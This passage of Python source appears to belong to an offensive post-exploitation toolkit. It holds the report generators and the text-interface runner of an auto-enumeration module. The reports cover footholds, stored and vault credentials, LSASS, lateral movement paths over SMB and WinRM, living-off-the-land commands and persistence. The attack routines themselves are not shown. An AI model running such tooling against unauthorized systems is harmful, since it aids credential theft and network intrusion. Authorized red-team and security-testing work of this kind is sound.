                self.enumeration_data['vlan_bypass'] = {'network_devices': [], 'discovered_vlans': [], 'default_credentials_found': [], 'vulnerable_cves': [], 'bypass_techniques': []}
            progress.update(task, advance=100, description="[green]VLAN bypass enumeration complete")
        except Exception as e:
            self.enumeration_data['vlan_bypass'] = {'error': str(e), 'network_devices': [], 'discovered_vlans': [], 'default_credentials_found': [], 'vulnerable_cves': [], 'bypass_techniques': []}
            progress.update(task, advance=100)
    
    def _generate_remote_machine_reports(self, target: str, remote_data: Dict[str, Any], progress=None, task=None, report_gen=None, diagram_gen=None) -> None:
        """Generate reports for remote machines"""
        try:
            if report_gen is None:
                report_gen = ReportGenerator(self.console, self.enumeration_data)
            if diagram_gen is None:
                diagram_gen = DiagramGenerator(self.enumeration_data)
            
            # Create output directory structure
            from pathlib import Path
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_base = Path("enumeration_reports") / timestamp / "remote_targets"
            target_dir = report_base / f"{target.replace('.', '_')}_depth{remote_data.get('depth', 0)}"
            target_dir.mkdir(parents=True, exist_ok=True)
            
            # Generate text report
            text_report = report_gen.generate_text_report()
            (target_dir / "README.md").write_text(text_report)
            
            # Generate JSON report (for test compatibility)
            json_report = report_gen.generate_json_report()
            (target_dir / "report.json").write_text(json_report)
            
            # Generate HTML report (for test compatibility)
            html_report = report_gen.generate_html_report()
            (target_dir / "report.html").write_text(html_report)
            
            # Generate diagrams
            diagram_gen.generate_all_diagrams()
            diagram_gen.save_diagrams(str(target_dir))
            
            if progress and task:
                progress.update(task, advance=100)
        except Exception as e:
            self.console.print(f"[red]Error generating reports: {e}[/red]")
            if progress and task:
                progress.update(task, advance=100)


class ReportGenerator:
    """Generate comprehensive enumeration reports"""
    
    def __init__(self, console: Console, enumeration_data: Dict[str, Any]):
        self.console = console
        self.data = enumeration_data
    
    def generate_text_report(self) -> str:
        """Generate text report"""
        report = []
        report.append("=" * 80)
        report.append("COMPREHENSIVE ENUMERATION REPORT")
        report.append(f"Generated: {self.data['timestamp']}")
        report.append("=" * 80)
        report.append("")
        
        # Initial Host
        report.append("INITIAL FOOTHOLD")
        report.append("-" * 80)
        report.append(f"Initial Host: {self.data.get('initial_host', 'Unknown')}")
        report.append("")
        
        # Foothold
        report.append("FOOTHOLD ASSESSMENT")
        report.append("-" * 80)
        if 'foothold' in self.data:
            fh = self.data['foothold']
            report.append(f"Identity: {fh.get('identity', 'Unknown')}")
            report.append(f"Role: {fh.get('role', 'Unknown')}")
            report.append(f"Groups: {len(fh.get('groups', []))} groups found")
            report.append(f"Privileges: {len(fh.get('privileges', []))} privileges")
            report.append(f"Listening Ports: {len(fh.get('listening_ports', []))} ports")
            if fh.get('listening_ports'):
                report.append(f"  Ports: {', '.join(fh['listening_ports'][:10])}")
        report.append("")
        
        # Orientation
        report.append("LOCAL ORIENTATION")
        report.append("-" * 80)
        if 'orientation' in self.data:
            orient = self.data['orientation']
            report.append(f"Local Groups: Found")
            report.append(f"Local Admins: Found")
            report.append(f"Domain Groups: {len(orient.get('domain_groups', []))} groups")
            report.append(f"Service Accounts: Found")
            report.append(f"Scheduled Tasks: Found")
            report.append(f"Security Software: Found")
        report.append("")
        
        # Identity
        report.append("IDENTITY & CREDENTIALS")
        report.append("-" * 80)
        if 'identity' in self.data:
            ident = self.data['identity']
            report.append(f"Stored Credentials: {'Found' if ident.get('stored_credentials') else 'None'}")
            report.append(f"Vault Credentials: {'Found' if ident.get('vault_credentials') else 'None'}")
            report.append(f"Domain Admins: {'Found' if ident.get('domain_admins') else 'None'}")
            report.append(f"LSASS Process: {'Found' if ident.get('lsass_process') else 'Not found'}")
        report.append("")
        
        # Network
        report.append("NETWORK DISCOVERY")
        report.append("-" * 80)
        if 'network' in self.data:
            net = self.data['network']
            report.append(f"Local IPs: {len(net.get('local_ips', []))} IPs")
            if net.get('local_ips'):
                report.append(f"  IPs: {', '.join(net['local_ips'][:5])}")
            report.append(f"ARP Targets: {len(net.get('arp_targets', []))} targets")
            report.append(f"Domains: {'Found' if net.get('domains') else 'None'}")
            report.append(f"Domain Controllers: {'Found' if net.get('domain_controllers') else 'None'}")
            report.append(f"Local Shares: {'Found' if net.get('local_shares') else 'None'}")
        report.append("")
        
        # Lateral Targets
        report.append("LATERAL MOVEMENT TARGETS")
        report.append("-" * 80)
        if 'lateral_targets' in self.data:
            targets = self.data['lateral_targets']
            if isinstance(targets, list):
                report.append(f"Potential Targets: {len(targets)}")
                for target in targets[:10]:
                    if isinstance(target, dict):
                        report.append(f"  - {target.get('target', 'Unknown')}: SMB={target.get('smb_accessible', False)}, WinRM={target.get('winrm_accessible', False)}")
            else:
                report.append("Potential Targets: 0")
        else:
            report.append("Potential Targets: 0")
        report.append("")
        
        # Lateral Movement Paths
        report.append("AUTOMATIC LATERAL MOVEMENT PATHS")
        report.append("-" * 80)
        if 'lateral_paths' in self.data:
            paths = self.data['lateral_paths']
            if isinstance(paths, list) and paths:
                report.append(f"Lateral Movement Paths: {len(paths)}")
                report.append(f"Maximum Depth Reached: {max([p.get('depth', 0) for p in paths] + [0])}")
                report.append("")
                for i, path_info in enumerate(paths, 1):
                    if isinstance(path_info, dict):
                        path = path_info.get('path', [])
                        depth = path_info.get('depth', 0)
                        method = path_info.get('method', 'unknown')
                        target = path_info.get('target', 'Unknown')
                        report.append(f"Path {i}: {' -> '.join(path)}")
                        report.append(f"  Depth: {depth}")
                        report.append(f"  Method: {method}")
                        enum = path_info.get('enumeration', {})
                        if enum.get('system_info', {}).get('os'):
                            report.append(f"  OS: {enum['system_info']['os'][:50]}")
                        if enum.get('shares'):
                            report.append(f"  Shares: {len(enum['shares'])} found")
                        report.append("")
            else:
                report.append("Lateral Movement Paths: 0")
        else:
            report.append("Lateral Movement Paths: 0")
        report.append("")
        
        # LOTL Techniques Used
        report.append("LOTL TECHNIQUES USED")
        report.append("-" * 80)
        if 'lolbins_used' in self.data:
            lolbins = self.data['lolbins_used']
            report.append(f"LOTL Commands Executed: {len(lolbins)}")
            report.append("")
            
            # Group by technique
            wmic_cmds = [c for c in lolbins if 'wmic' in c.lower()]
            schtasks_cmds = [c for c in lolbins if 'schtasks' in c.lower()]
            net_cmds = [c for c in lolbins if 'net view' in c.lower() or 'net share' in c.lower()]
            ps_cmds = [c for c in lolbins if 'powershell' in c.lower() or 'invoke' in c.lower()]
            
            if wmic_cmds:
                report.append(f"WMI Commands ({len(wmic_cmds)}):")
                for cmd in wmic_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
            
            if schtasks_cmds:
                report.append(f"Scheduled Task Commands ({len(schtasks_cmds)}):")
                for cmd in schtasks_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
            
            if net_cmds:
                report.append(f"Net Commands ({len(net_cmds)}):")
                for cmd in net_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
            
            if ps_cmds:
                report.append(f"PowerShell Remoting ({len(ps_cmds)}):")
                for cmd in ps_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
        report.append("")
        
        # Persistence
        report.append("PERSISTENCE MECHANISMS")
        report.append("-" * 80)
        if 'persistence' in self.data:
            persist = self.data['persistence']
            report.append(f"Recent Tasks: {'Found' if persist.get('recent_tasks') else 'None'}")
            report.append(f"Services: {'Found' if persist.get('services') else 'None'}")
            report.append(f"WMI Subscriptions: {'Found' if persist.get('wmi_subscriptions') else 'None'}")
            report.append(f"Registry Run Keys: {'Found' if persist.get('registry_run_hkcu') or persist.get('registry_run_hklm') else 'None'}")
        report.append("")
        
        # Certificates
        report.append("CERTIFICATES")
        report.append("-" * 80)
        if 'certificates' in self.data:
            certs = self.data['certificates']
            if certs.get('generated_certs'):
                report.append(f"Generated Certificates: {len(certs['generated_certs'])}")
                for cert in certs['generated_certs']:
                    report.append(f"  - {cert['name']} ({cert['type']})")
            else:
                report.append("Generated Certificates: None")
        report.append("")
        
        report.append("=" * 80)
        report.append("END OF REPORT")
        report.append("=" * 80)
        
        return '\n'.join(report)
    
    def generate_json_report(self) -> str:
        """Generate JSON report"""
        return json.dumps(self.data, indent=2, default=str)
    
    def generate_html_report(self) -> str:
        """Generate HTML report"""
        html = []
        html.append("<!DOCTYPE html>")
        html.append("<html><head><title>Enumeration Report</title>")
        html.append("<style>body{font-family:Arial;margin:20px;}h1{color:#333;}h2{border-bottom:2px solid #333;padding-bottom:5px;}table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ddd;padding:8px;text-align:left;}th{background-color:#4CAF50;color:white;}</style>")
        html.append("</head><body>")
        html.append(f"<h1>Comprehensive Enumeration Report</h1>")
        html.append(f"<p><strong>Generated:</strong> {self.data['timestamp']}</p>")
        
        # Foothold
        html.append("<h2>Foothold Assessment</h2>")
        if 'foothold' in self.data:
            fh = self.data['foothold']
            html.append(f"<p><strong>Identity:</strong> {fh.get('identity', 'Unknown')}</p>")
            html.append(f"<p><strong>Role:</strong> {fh.get('role', 'Unknown')}</p>")
            html.append(f"<p><strong>Groups:</strong> {len(fh.get('groups', []))} groups</p>")
            html.append(f"<p><strong>Listening Ports:</strong> {len(fh.get('listening_ports', []))} ports</p>")
        
        # Network
        html.append("<h2>Network Discovery</h2>")
        if 'network' in self.data:
            net = self.data['network']
            html.append(f"<p><strong>Local IPs:</strong> {len(net.get('local_ips', []))}</p>")
            html.append(f"<p><strong>ARP Targets:</strong> {len(net.get('arp_targets', []))}</p>")
        
        # Lateral Targets
        html.append("<h2>Lateral Movement Targets</h2>")
        if 'lateral_targets' in self.data:
            targets = self.data['lateral_targets']
            if targets and isinstance(targets, list):
                html.append("<table><tr><th>Target</th><th>SMB</th><th>WinRM</th></tr>")
                for target in targets[:10]:
                    if isinstance(target, dict):
                        html.append(f"<tr><td>{target.get('target', 'Unknown')}</td>")
                        html.append(f"<td>{'Yes' if target.get('smb_accessible') else 'No'}</td>")
                        html.append(f"<td>{'Yes' if target.get('winrm_accessible') else 'No'}</td></tr>")
                html.append("</table>")
            else:
                html.append("<p>No targets found</p>")
        
        # Lateral Movement Paths
        html.append("<h2>Automatic Lateral Movement Paths</h2>")
        if 'lateral_paths' in self.data:
            paths = self.data['lateral_paths']
            if paths:
                html.append("<table><tr><th>Path</th><th>Depth</th><th>Method</th><th>Details</th></tr>")
                for path_info in paths:
                    if isinstance(path_info, dict):
                        path = path_info.get('path', [])
                        depth = path_info.get('depth', 0)
                        method = path_info.get('method', 'unknown')
                        html.append(f"<tr><td>{' -> '.join(path)}</td>")
                        html.append(f"<td>{depth}</td>")
                        html.append(f"<td>{method}</td>")
                        enum = path_info.get('enumeration', {})
                        html.append(f"<td>OS: {enum.get('system_info', {}).get('os', 'Unknown')[:30]}</td></tr>")
                html.append("</table>")
            else:
                html.append("<p>No lateral movement performed</p>")
        
        # LOTL Techniques
        html.append("<h2>LOTL Techniques Used</h2>")
        if 'lolbins_used' in self.data:
            lolbins = self.data['lolbins_used']
            html.append(f"<p><strong>Total LOTL Commands:</strong> {len(lolbins)}</p>")
            html.append("<ul>")
            for cmd in lolbins[:20]:
                html.append(f"<li>{cmd}</li>")
            html.append("</ul>")
        
        html.append("</body></html>")
        return '\n'.join(html)
    
    def display_report(self):
        """Display report in console"""
        self.console.print("\n[bold cyan]ENUMERATION REPORT[/bold cyan]\n")
        
        # Summary table
        table = Table(title="Enumeration Summary", box=box.ROUNDED)
        table.add_column("Category", style="cyan")
        table.add_column("Status", style="white")
        table.add_column("Items Found", style="green")
        
        # Foothold
        fh = self.data.get('foothold', {})
        table.add_row("Foothold", "Complete", f"{len(fh.get('groups', []))} groups, {len(fh.get('listening_ports', []))} ports")
        
        # Orientation
        orient = self.data.get('orientation', {})
        table.add_row("Orientation", "Complete", "Service accounts, tasks, security software")
        
        # Identity
        ident = self.data.get('identity', {})
        cred_count = sum([1 for k in ['stored_credentials', 'vault_credentials', 'domain_admins'] if ident.get(k)])
        table.add_row("Identity", "Complete", f"{cred_count} credential sources")
        
        # Network
        net = self.data.get('network', {})
        table.add_row("Network", "Complete", f"{len(net.get('local_ips', []))} IPs, {len(net.get('arp_targets', []))} targets")
        
        # Lateral Targets
        targets = self.data.get('lateral_targets', [])
        target_count = len(targets) if isinstance(targets, list) else 0
        table.add_row("Lateral Targets", "Complete", f"{target_count} targets")
        
        # Lateral Movement Paths
        paths = self.data.get('lateral_paths', [])
        path_count = len(paths) if isinstance(paths, list) else 0
        max_depth = max([p.get('depth', 0) for p in paths] + [0]) if paths and isinstance(paths, list) else 0
        table.add_row("Lateral Movement", "Complete", f"{path_count} paths (max depth: {max_depth})")
        
        # LOTL Techniques
        lolbins = self.data.get('lolbins_used', [])
        table.add_row("LOTL Techniques", "Complete", f"{len(lolbins)} commands executed")
        
        # Persistence
        persist = self.data.get('persistence', {})
        persist_count = sum([1 for k in ['recent_tasks', 'services', 'wmi_subscriptions'] if persist.get(k)])
        table.add_row("Persistence", "Complete", f"{persist_count} mechanisms")
        
        self.console.print(table)
        self.console.print()


class AutoEnumerateModule:
    """Auto-Enumeration Module for TUI"""
    
    def run(self, console: Console, session_data: dict):
        """Run auto-enumeration"""
        # Allow depth override
        default_depth = session_data.get('AUTO_ENUMERATE_DEPTH', 3)
        console.print(f"\n[bold cyan]Current lateral movement depth: {default_depth}[/bold cyan]")
        
        if Confirm.ask(f"[bold]Override depth? (default: {default_depth})[/bold]", default=False):
            try:
                new_depth = int(Prompt.ask("Enter maximum depth", default=str(default_depth)))
                if new_depth < 1:
                    console.print("[yellow]Depth must be at least 1, using default[/yellow]")
                    new_depth = default_depth
                session_data['AUTO_ENUMERATE_DEPTH'] = new_depth
                console.print(f"[green]Depth set to: {new_depth}[/green]\n")
            except ValueError:
                console.print("[yellow]Invalid depth, using default[/yellow]\n")
        
        enumerator = AutoEnumerator(console, session_data)
        
        console.print("\n[bold yellow]Starting comprehensive enumeration...[/bold yellow]\n")
        
        # Run enumeration
        enumeration_data = enumerator.run_full_enumeration()
        
        # Generate report
        report_gen = ReportGenerator(console, enumeration_data)
        report_gen.display_report()
        
        # Export options
        console.print("\n[bold]Export Options:[/bold]\n")
        
        export_format = Prompt.ask(
            "Export format",
            choices=['text', 'json', 'html', 'all', 'none'],
            default='all'
        )
        
        if export_format != 'none':
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if export_format in ['text', 'all']:
                text_report = report_gen.generate_text_report()
                filename = f"enumeration_report_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text_report)
                console.print(f"[green]Text report saved:[/green] {filename}")
            
            if export_format in ['json', 'all']:
                json_report = report_gen.generate_json_report()
                filename = f"enumeration_report_{timestamp}.json"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(json_report)
                console.print(f"[green]JSON report saved:[/green] {filename}")
            
            if export_format in ['html', 'all']:
                html_report = report_gen.generate_html_report()
                filename = f"enumeration_report_{timestamp}.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(html_report)
                console.print(f"[green]HTML report saved:[/green] {filename}")
        
        # Export DiagramGenerator and ReportGenerator for testing
        # These are accessible via: from modules.auto_enumerate import DiagramGenerator, ReportGenerator
        
        console.print("\n[green]Enumeration complete![/green]")
